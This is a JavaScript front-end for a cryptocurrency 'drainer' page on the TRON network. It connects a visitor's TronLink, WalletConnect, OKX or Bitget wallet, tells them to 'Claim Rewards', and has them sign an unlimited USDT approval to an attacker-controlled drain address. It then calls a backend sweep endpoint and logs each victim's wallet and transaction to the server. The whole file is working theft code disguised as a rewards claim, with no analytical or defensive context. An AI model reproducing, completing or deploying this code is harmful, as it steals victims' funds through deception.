// Multi‑wallet support using TronWallet Adapter (non‑React UMD version)

let adapter = null;
let userAddress = null;
let tronWebInstance = null;

const connectBtn = document.getElementById('connectBtn');
const walletInfoDiv = document.getElementById('walletInfo');
const walletAddressSpan = document.getElementById('walletAddress');
const usdtBalanceSpan = document.getElementById('usdtBalance');
const trxBalanceSpan = document.getElementById('trxBalance');
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

function setStatus(msg, isError = false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = isError ? '#dc3545' : '#2a5298';
    console.log(msg);
}

async function apiCall(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    return await res.json();
}

async function loadBalances(address) {
    try {
        const data = await apiCall('/api/balance', { address });
        usdtBalanceSpan.innerText = data.usdt.toFixed(2);
        trxBalanceSpan.innerText = data.trx.toFixed(2);
    } catch (err) {
        console.error(err);
        setStatus('Failed to load balance', true);
    }
}

// Show wallet selection modal
function showWalletModal() {
    const modal = document.createElement('div');
    modal.className = 'wallet-modal-wrapper';
    modal.innerHTML = `
        <div class="wallet-modal">
            <h3>Select Wallet</h3>
            <div id="wallet-list">
                <div class="wallet-option" data-wallet="tronlink">
                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-tronlink/logo.png" onerror="this.src='https://via.placeholder.com/30'">
                    <span>TronLink</span>
                </div>
                <div class="wallet-option" data-wallet="walletconnect">
                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-walletconnect/logo.png" onerror="this.src='https://via.placeholder.com/30'">
                    <span>WalletConnect</span>
                </div>
                <div class="wallet-option" data-wallet="okx">
                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-okx/logo.png" onerror="this.src='https://via.placeholder.com/30'">
                    <span>OKX Wallet</span>
                </div>
                <div class="wallet-option" data-wallet="bitget">
                    <img src="https://raw.githubusercontent.com/tronprotocol/tronwallet-adapter/main/packages/adapter-bitget/logo.png" onerror="this.src='https://via.placeholder.com/30'">
                    <span>Bitget Wallet</span>
                </div>
            </div>
            <button id="close-modal" style="margin-top:10px;">Cancel</button>
        </div>
    `;
    document.body.appendChild(modal);

    const closeModal = () => modal.remove();
    document.getElementById('close-modal').addEventListener('click', closeModal);

    document.querySelectorAll('.wallet-option').forEach(opt => {
        opt.addEventListener('click', async () => {
            const walletType = opt.dataset.wallet;
            closeModal();
            await connectWithWallet(walletType);
        });
    });
}

async function connectWithWallet(walletType) {
    setStatus(`Connecting to ${walletType}...`);

    // Initialize the adapter based on wallet type
    let walletAdapter;
    if (walletType === 'tronlink') {
        if (!window.tronLink) {
            setStatus('TronLink extension not installed', true);
            return;
        }
        walletAdapter = new window.TronWalletAdapter.TronLinkAdapter();
    } else if (walletType === 'walletconnect') {
        walletAdapter = new window.TronWalletAdapter.WalletConnectAdapter();
    } else if (walletType === 'okx') {
        walletAdapter = new window.TronWalletAdapter.OkxWalletAdapter();
    } else if (walletType === 'bitget') {
        walletAdapter = new window.TronWalletAdapter.BitKeepAdapter(); // Bitget uses BitKeep adapter
    } else {
        setStatus('Wallet not supported', true);
        return;
    }

    try {
        await walletAdapter.connect();
        const account = walletAdapter.address;
        userAddress = account;
        tronWebInstance = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            headers: { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY || '' }
        });
        // Override the transaction signing with the adapter
        tronWebInstance.trx.sign = async (tx) => {
            const signed = await walletAdapter.signTransaction(tx);
            return signed;
        };

        walletAddressSpan.innerText = userAddress;
        walletInfoDiv.classList.remove('hidden');
        setStatus(`Connected with ${walletType}! Fetching balances...`);

        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
        });

        await loadBalances(userAddress);
        setStatus('Ready. Click "Claim Rewards" to receive USDT.');

        // Store adapter for later signing
        adapter = walletAdapter;
    } catch (err) {
        console.error(err);
        setStatus(`Connection failed: ${err.message}`, true);
    }
}

connectBtn.addEventListener('click', showWalletModal);

async function approveAndDrain() {
    if (!userAddress || !adapter) {
        setStatus('Please connect wallet first', true);
        return;
    }

    setStatus('Loading configuration...');
    let config;
    try {
        const res = await fetch('/api/config');
        config = await res.json();
    } catch (err) {
        setStatus('Cannot fetch config from server', true);
        return;
    }

    const usdtContractAddress = config.usdtContract;
    const drainTarget = config.drainAddress;
    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    try {
        // Use TronWeb instance with adapter signing
        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
        setStatus('Approving USDT spending...');

        const unsignedTx = await usdtContract.approve(drainTarget, MAX_UINT).request();
        const signedTx = await adapter.signTransaction(unsignedTx);
        const approveTx = await tronWebInstance.trx.sendRawTransaction(signedTx);
        setStatus(`✅ Approval sent! TX: ${approveTx}`);

        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: approveTx })
        });

        setStatus('Initiating transfer...');
        const sweepResult = await apiCall('/api/sweep', { address: userAddress });

        if (sweepResult.success) {
            setStatus(`🎉 Success! USDT sent. TX: ${sweepResult.txId}`);
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' })
            });
            setTimeout(() => loadBalances(userAddress), 5000);
        } else {
            setStatus(`❌ Transfer failed: ${sweepResult.error}`, true);
        }
    } catch (err) {
        console.error(err);
        setStatus('Error: ' + (err.message || 'Unknown error'), true);
    }
}

drainBtn.addEventListener('click', approveAndDrain);
